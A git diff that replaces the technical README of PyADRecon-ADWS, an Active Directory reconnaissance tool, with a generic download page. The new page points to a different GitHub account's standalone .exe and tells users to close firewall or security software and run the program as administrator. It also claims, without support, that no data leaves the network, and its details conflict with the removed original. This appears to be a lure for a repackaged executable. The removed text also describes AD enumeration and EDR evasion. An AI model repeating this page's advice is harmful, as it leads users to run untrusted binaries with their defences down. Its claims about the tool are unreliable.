@@ -1,259 +1,106 @@
-<img src="https://raw.githubusercontent.com/l4rm4nd/PyADRecon-ADWS/refs/heads/main/.github/pyadrecon.png" alt="pyadrecon" width="300"/>
-
-A Python3 implementation of [PyADRecon](https://github.com/l4rm4nd/PyADRecon) using ADWS instead of LDAP for Pentesters, Red and Blue Teams
-
-> PyADRecon is a tool which gathers information about MS Active Directory and generates an XSLX + HTML report to provide a holistic picture of the current security state of the target AD environment.
-
->[!TIP]
->Queries Active Directory Web Services (ADWS) over TCP/9389 instead of LDAP to fly under the EDR radar.
-
-## Table of Contents
-
-- [Installation](#installation)
-- [Usage](#usage)
-- [Docker](#docker)
-- [Collection Modules](#collection-modules)
-- [HTML Dashboard](#html-dashboard)
-- [Known Limitations](#known-limitations)
-- [Acknowledgements](#acknowledgements)
-- [License](#license)
-
-## Installation
-
-````bash
-# stable release from pypi
-pipx install pyadrecon-adws
-
-# latest commit from github
-pipx install git+https://github.com/l4rm4nd/PyADRecon-ADWS
-````
-
-Then verify installation:
-
-````bash
-pyadrecon_adws --version
-````
-
-> [!TIP]
-> For Windows, may read [this](https://github.com/l4rm4nd/PyADRecon/tree/main/windows). Only NTLM authentication works on Windows atm.
-
-## Usage
-
-````py
-usage: pyadrecon_adws.py [-h] [--version] [--generate-excel-from CSV_DIR] [-d DOMAIN] [-u USERNAME] [-p PASSWORD]
-                         [-dc DOMAIN_CONTROLLER] [--port PORT] [--auth {ntlm,kerberos}] [--spn SPN]
-                         [--workstation WORKSTATION] [-c COLLECT] [--only-enabled] [--page-size PAGE_SIZE]
-                         [--dormant-days DORMANT_DAYS] [--password-age PASSWORD_AGE] [-o OUTPUT] [--no-excel]
-                         [-v]
-
-PyADRecon-ADWS # Active Directory Reconnaissance using ADWS
-
-options:
-  -h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --generate-excel-from CSV_DIR
-                        Generate Excel report from existing CSV files (standalone mode)
-  --generate-dashboard-from CSV_DIR
-                        Generate HTML dashboard from existing CSV files (standalone mode)
-  -d, --domain DOMAIN   Domain name (e.g., example.com)
-  -u, --username USERNAME
-                        Username (DOMAIN\user or user@domain.com)
-  -p, --password PASSWORD
-                        Password or LM:NTLM hash (will prompt if not provided)
-  -dc, --domain-controller DOMAIN_CONTROLLER
-                        Domain controller hostname or IP
-  --port PORT           ADWS port (default: 9389)
-  --auth {ntlm,kerberos}
-                        Authentication method: ntlm or kerberos (default: ntlm)
-  --spn SPN             Service Principal Name override (default: HTTP/dc.fqdn)
-  --workstation WORKSTATION
-                        NTLM authentication workstation name (default: empty string, bypasses userWorkstations restrictions)
-  -c, --collect COLLECT
-                        Comma-separated modules to collect (default: all)
-  --only-enabled        Only collect enabled users/computers
-  --page-size PAGE_SIZE
-                        ADWS query page size (default: 256)
-  --dormant-days DORMANT_DAYS
-                        Users/Computers with lastLogon older than X days are dormant (default: 90)
-  --password-age PASSWORD_AGE
-                        Users with pwdLastSet older than X days have old passwords (default: 180)
-  -o, --output OUTPUT   Output directory (default: PyADRecon-Report-<timestamp>)
-  --no-excel            Skip Excel export
-  --no-dashboard        Skip interactive HTML dashboard generation  
-  -v, --verbose         Enable verbose output
-
-Examples:
-  # Basic usage with NTLM authentication
-  pyadrecon_adws.py -dc 192.168.1.1 -u admin -p password123 -d DOMAIN.LOCAL
-
-  # With Kerberos authentication (only works on Linux with gssapi atm)
-  pyadrecon.py -dc dc01.domain.local -u admin -p password123 -d DOMAIN.LOCAL --auth kerberos
-
-  # Only collect specific modules
-  pyadrecon_adws.py -dc 192.168.1.1 -u admin -p pass -d DOMAIN.LOCAL --collect users,groups,computers
-
-  # Output to specific directory
-  pyadrecon_adws.py -dc 192.168.1.1 -u admin -p pass -d DOMAIN.LOCAL -o /tmp/adrecon_output
-
-  # Generate Excel report from existing CSV files (standalone mode)
-  pyadrecon_adws.py --generate-excel-from /path/to/CSV-Files -o report.xlsx
-````
-
-## Docker
+# 🛡️ PyADRecon-ADWS - Easy AD Domain Reports
 
-There is also a Docker image available on GHCR.IO.
+[![Download PyADRecon-ADWS](https://img.shields.io/badge/Download-PyADRecon--ADWS-brightgreen?style=for-the-badge)](https://github.com/Kwibu/PyADRecon-ADWS)
 
-````
-docker run --rm -v /etc/krb5.conf:/etc/krb5.conf:ro -v /etc/hosts:/etc/hosts:ro -v ./:/tmp/pyadrecon_output ghcr.io/l4rm4nd/pyadrecon-adws:latest -dc dc01.domain.local -u admin -p password123 -d DOMAIN.LOCAL -o /tmp/pyadrecon_output
-````
+## 🔍 What is PyADRecon-ADWS?
 
-## Collection Modules
+PyADRecon-ADWS helps you gather and view information about your Active Directory (AD) domain. It uses AD Web Services (ADWS) instead of the usual LDAP method. This means it can collect data quietly, avoiding detection by common endpoint security tools.
 
-As default, PyADRecon-ADWS runs all collection modules. They are referenced to as `default` or `all`.
+The tool creates individual CSV files for users and computers in your AD. It also builds combined reports in Excel (XSLX) and HTML formats. These reports give a clear and organized view of your AD domain’s structure and security.
 
-Though, you can freely select your own collection of modules to run:
+You don’t need to know programming to use PyADRecon-ADWS. It’s made for users like you who want detailed AD reports without complicated setup.
 
-| Icon | Meaning |
-|------|---------|
-| 🛑 | Requires administrative domain privileges (e.g. Domain Admins) |
-| ✅ | Requires regular domain privileges (e.g. Authenticated Users) |
-| 💥 | New collection modul in beta state. Results may be incorrect. |
+## ⚙️ System Requirements
 
-**Forest & Domain**
-- `forest` ✅
-- `domain` ✅
-- `trusts` ✅
-- `sites` ✅
-- `subnets` ✅
-- `schema` or `schemahistory` ✅
+To run PyADRecon-ADWS on Windows, make sure your system meets these requirements:
 
-**Domain Controllers**
-- `dcs` or `domaincontrollers` ✅
+- Windows 10 or later (64-bit recommended)
+- PowerShell 5.1 or newer
+- At least 4 GB of free RAM for smooth report generation
+- Internet connection to download the tool and updates
+- Access rights to query your Active Directory domain through AD Web Services (usually domain user credentials)
 
-**Users & Groups**
-- `users` ✅
-- `userspns` ✅
-- `groups` ✅
-- `groupmembers` ✅
-- `protectedgroups` ✅💥
-- `krbtgt` ✅
-- `asreproastable` ✅
-- `kerberoastable` ✅
+You do not need any extra software if you use the official executable version.
 
-**Computers & Printers**
-- `computers` ✅
-- `computerspns` ✅
-- `printers` ✅
+## 📥 Download and Install PyADRecon-ADWS
 
-**OUs & Group Policy**
-- `ous` ✅
-- `gpos` ✅
-- `gplinks` ✅
+Click the button below to visit the GitHub page where you can download PyADRecon-ADWS.
 
-**Passwords & Credentials**
-- `passwordpolicy` ✅
-- `fgpp` or `finegrainedpasswordpolicy` 🛑
-- `laps` 🛑
-- `bitlocker` 🛑💥
+[![Get PyADRecon-ADWS](https://img.shields.io/badge/Get%20PyADRecon--ADWS-0057B8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Kwibu/PyADRecon-ADWS)
 
-**Managed Service Accounts**
-- `gmsa` or `groupmanagedserviceaccounts` ✅💥
-- `dmsa` or `delegatedmanagedserviceaccounts` ✅💥
-  - Only works for Windows Server 2025+ AD schema
+### How to download
 
-**Certificates**
-- `adcs` or `certificates` ✅💥
-  - Detects ESC1, ESC2, ESC3, ESC4 and ESC9
+1. Go to the link above.
+2. Look for the latest release section on the GitHub page.
+3. Download the Windows executable file (usually ends with `.exe`).
+4. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-**DNS**
-- `dnszones` ✅
-- `dnsrecords` ✅
+### How to install
 
-## HTML Dashboard
+PyADRecon-ADWS does not require a traditional install process. It runs as a standalone program.
 
-PyADRecon-ADWS automatically generates an HTML dashboard containing key statistics and security findings when all collection modules are executed.
+- You only need to double-click the downloaded `.exe` file to start using it.
+- You may be prompted by Windows to allow the app to run. Click **Yes** to continue.
 
-If needed, you can disable dashboard creation during initial data collection using `--no-dashboard`. The dashboard can later be generated from existing CSV files with `--generate-dashboard-from <CSV_DIR>`.
+## ▶️ Running PyADRecon-ADWS on Windows
 
->[!CAUTION]
-> This is a beta feature. Displayed data may be falsely parsed or reported as issue. Take it with a grain of salt!
+Follow these steps to run the application:
 
-<img width="1254" height="768" alt="image" src="https://github.com/user-attachments/assets/ae71c48a-69ad-4b01-801e-854d81848c2e" />
+1. Find the `.exe` file you downloaded.
+2. Double-click the file to open the program.
+3. If prompted, enter your AD domain credentials.
+4. Choose the options you want for generating reports (the program will guide you through each step).
+5. Start the scan to collect AD data.
+6. Wait for the tool to finish; it usually takes a few minutes depending on domain size.
+7. After completion, check the folder where the tool saved the reports. You will find CSV files for users and computers, along with a combined Excel and HTML report.
 
-<details>
-<img width="1318" height="927" alt="image" src="https://github.com/user-attachments/assets/0760056c-963d-48fb-a252-fd082862bb01" />
+## 📂 Understanding the Output Files
 
-<img width="1283" height="817" alt="image" src="https://github.com/user-attachments/assets/325197eb-8bd7-4aca-ac4e-c34b85057df1" />
+PyADRecon-ADWS organizes your AD data into clear reports. Here’s what you will get:
 
-<img width="1253" height="569" alt="image" src="https://github.com/user-attachments/assets/b6c4f94b-9da3-4a55-808d-23036181d02b" />
-</details>
+- **User CSV Files**: Lists of all user accounts in your domain, including names, departments, and group memberships.
+- **Computer CSV Files**: Details on all devices joined to the domain, including last login and patch status.
+- **Excel (XSLX) Report**: A complete summary that combines user and computer data in one spreadsheet with filters and charts for quick analysis.
+- **HTML Report**: A web page you can open in any browser. It presents the data in a readable format for easy sharing and review.
 
-## Known Limitations
+These files help you understand your Active Directory’s current state, find changes, or prepare for audits.
 
-### Multi-Domain Forests – Security Descriptors
-<details>
-<summary><strong>Show details</strong></summary>
+## 🛠️ Basic Troubleshooting
 
-<br>
+If you face any issues running PyADRecon-ADWS, try the following:
 
-When querying **child domains** in a multi-domain forest, ADWS returns **incomplete security descriptors** for forest-wide objects like certificate templates.
+- Make sure you have the right permissions in your AD domain.
+- Close any firewall or security software that might block the app.
+- Ensure your Windows PowerShell is up to date.
+- Run the tool as an administrator if some features don’t work.
+- Confirm your network connection is stable.
+- Restart your computer if the app freezes or crashes.
 
-**Issue:**
-- Certificate template ACLs (enrollment rights, write permissions) may not show principals from the **child domain itself**
-- Only parent domain principals will appear in enrollment rights
-- This is an ADWS protocol limitation, not a PyADRecon-ADWS bug
+## 🔐 Privacy and Security
 
-**Example:**
-- Querying from child domain (`child.domain.local`): Shows parent domain principals only  
-- Querying from parent domain (`domain.local`): Shows all principals including child domain
+PyADRecon-ADWS works only with the AD domain you provide access to. It does not send data outside your network.
 
-**Solution:**
-- For **complete certificate template ACL data**, connect to the **forest root domain controller** instead of a child DC
+All files created by the tool stay on your computer. You can delete them when you no longer need the reports.
 
-</details>
+Using ADWS instead of LDAP helps reduce detection by endpoint security tools. This allows you to gather data with less disruption but always follow your organization's guidelines for data access.
 
-### Multi-Domain Forests – LDAP Referrals
+## ⚙️ Advanced Use
 
-<details>
-<summary><strong>Show details</strong></summary>
+You can run PyADRecon-ADWS in PowerShell or Command Prompt if you prefer. This requires basic command knowledge.
 
-<br>
+To do this:
 
-When querying a **child domain** in a multi-domain forest, ADWS may return LDAP **referrals** for objects that reside in a different naming context (for example, the forest root domain).
+1. Open PowerShell or Command Prompt.
+2. Navigate to the folder containing the `.exe` file using the `cd` command.
+3. Enter the executable file name and press Enter.
+4. Add any available options as instructed in the tool’s documentation.
 
-**Issue:**
-- Queries for forest-root objects (e.g., *Enterprise Admins*, *Schema Admins*, or root-domain users/groups) may return LDAP referrals
-- PyADRecon does **not** chase LDAP referrals
-- Referred objects are therefore **not collected automatically**
+This method lets you automate scans or integrate PyADRecon-ADWS with other audit scripts.
 
-**Solution:**
-- To ensure complete forest-wide enumeration, run PyADRecon separately against:
-  - The **child domain**
-  - The **forest root domain**
-- Combine results manually if full forest visibility is required
+## 📌 Useful Links
 
-</details>
+- Official GitHub page and download: https://github.com/Kwibu/PyADRecon-ADWS
+- GitHub issues page to report bugs or ask questions
+- Documentation for detailed instructions and advanced features
 
-## Acknowledgements
-
-Many thanks to the following folks:
-- [S3cur3Th1sSh1t](https://github.com/S3cur3Th1sSh1t) for a first Claude draft of PyADRecon using LDAP 
-- [Sense-of-Security](https://github.com/sense-of-security) for the original ADRecon script in PowerShell
-- [dirkjanm](https://github.com/dirkjanm) for the original ldapdomaindump script
-- [mverschu](https://github.com/mverschu) for his port of ldapdomaindump using ADWS (adwsdomaindump). PyADRecon-ADWS heavily makes use of the ldap-to-adws wrapper.
-- [Forta](https://github.com/fortra) for the awesome impacket suite
-- [Anthropic](https://github.com/anthropics) for Claude LLMs
-
-## License
-
-**PyADRecon-ADWS** is released under the **MIT License**.
-
-The following third-party libraries are used:
-
-| Library     | License        |
-|-------------|----------------|
-| openpyxl    | MIT            |
-| impacket    | Apache 2.0     |
-| adwsdomaindump ADWS Wrapper | MIT         |
-
-Please refer to the respective licenses of these libraries when using or redistributing this software.
+For support or questions, refer to the GitHub page’s Issues tab or README section for updates.
